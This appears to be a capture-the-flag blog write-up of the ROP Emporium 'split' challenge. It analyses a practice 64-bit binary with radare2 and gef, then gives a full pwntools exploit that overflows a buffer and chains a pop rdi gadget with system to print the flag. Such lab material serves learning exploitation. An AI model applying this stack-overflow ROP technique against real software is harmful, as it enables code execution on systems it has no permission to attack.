---
layout: post
title:  "ROP Emporium - split"
date:   2020-05-8 14:07:19
categories: [ROP]
excerpt: "This is the Second challenge from ROP Emporium, named "Split". In this i am, going to write a small ROP chain to complete this challenge. Going to use radare2 as much as i can, just for the sake of learning the tool. Radare2 is a complete framework for reverse-engineering and analyzing binaries."

comments: true
---


## Introduction
This is the Second challenge from ROP Emporium, named "Split". In this challenge we have to create a small ROP Chain which execute system and give us the flag to complete the challenge. In this iam going to use radare2 as much as i can, just for the sake of learning the tool. Radare2 is a complete framework for reverse-engineering and analyzing binaries.

###### Challenge Description 
Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain. 

###### About the Binary:
Our binary is usual ELF executable in 64-bit architecture.Lets check what protection are on this binary, using rabin2, which comes with radare2 framework.

![source-01](/img/Screenshot_2020-05-13_12-32-28.png){: .align-left}


PIE isn't enabled and nx set to true, we know shellcode cannot be executed off the stack and we know binary has ASLR disabled.

## Analyzing the 64bit ELF binary
Lets load the binary with radare2 and dump the functions.The afl command list the functions. We can also output it as JSON using this command aflj~{}

![source-01](/img/Screenshot_2020-05-13_08-41-16.png){: .align-left}


Here we can see interesting functions:
- main()
- pwnme()
- usefulFunction()

So lets disassemble and see what these fucntions does!

###### main():


![source-01](/img/Screenshot_2020-05-13_08-44-57.png){: .align-left}


The only interesting thing here for us is, its calling the function name pwnme() which have overflow vulnerability.

###### pwnme():


![source-01](/img/Screenshot_2020-05-13_08-48-45.png){: .align-left}


Just like in retwin challenge, we have a 32 byte buffer that can be overflowed with fgets that takes 96 characters from the user.


###### usefulFunction()


![source-01](/img/Screenshot_2020-05-13_08-34-01.png){: .align-left}


This function directly call system with /bin/ls, and there is also usefullstring which /bin/cat flag.txt so we need to return to this function to exploit the binary successfuly. 

Get strings 

![source-01](/img/Screenshot_2020-05-15_14-55-41.png){: .align-left}

## Fuzzing:
So now the binary analysis is out of the way. Lets start fuzzing the binary.
Run the program and send more than 40 bytes
```
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /root/Desktop/ROP/split/split/split 
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.

```
As expected the program segfaulted (crashed),we have a valid crash scenario here,but we are not sure if we have overwritten any registers.So lets attach the binary to gdb and analyze the crash.

Attach the binary to GDB using gdb -q splilit

###### Calculating offset
Generate the unique pattern and send to the program
```
gef➤  pattern offset 0x00007fffffffe048
[+] Searching '0x00007fffffffe048'
[+] Found at offset 40 (little-endian search) likely
[+] Found at offset 33 (big-endian search) 
gef➤  

```
Copy past the generated pattern to the program


![source-01](/img/Screenshot_2020-05-15_10-20-53.png){: .align-left}


The program has crashed and we have overwritten the rsp,to find the extact offset copy the hex at rsp to the clipboard, then type pattern offset.


![source-01](/img/Screenshot_2020-05-09_11-23-21.png){: .align-left}

#### Building ROP-Chain

Lets find the pieces we need to build a ROP chain.

- Offset
- string containing “/bin/cat flag.txt”, 
- Address of system
- pop rdi; ret

#### POP RDI RET

Lets find the address of pop rdi ret

![source-01](/img/Screenshot_2020-05-14_08-23-29.png	){: .align-left}



--------
Since this challenge only needs 1 argument, we just need to pass the /bin/cat flag.txt string into RDI register. 

------
#### Exploitation 

Now let’s craft the payload.

Junk + pop_rdi + bin_cat + system_plt

First padding offset to the stack pointer and gadget pop rdi; ret; as the /bin/cat flag.txt this will be stored in rdi register and we will just provide the system address and its done.


Full exploit using pwntools:

----
 
#!/usr/bin/python
from pwn import *
 
def main():
    junk = "A" * 40                     # RIP Offset at 40
    cat_flag = p64(0x00601060)          # Radare2 command: izz
    system_plt = p64(0x4005e0)          # objdump -d split | grep system
    pop_rdi = p64(0x0000000000400883)   # python ROPgadget.py --binary split | grep rdi
    p = process("./split")
    payload = junk + pop_rdi + cat_flag + system_plt
   p.sendlineafter(">", payload)
   print p.recvall()
 
if __name__ == "__main__":
    main() ----






w00t we got the flag!

###### End 

Thats the end of ret2win challenge,it is a very simple one but as i progress through the challenges the exploits will become more complex and fun. Remember never stop learning, Cheers!.

> Code for this challenge  https://github.com/d3b4g/ROP-Emporium






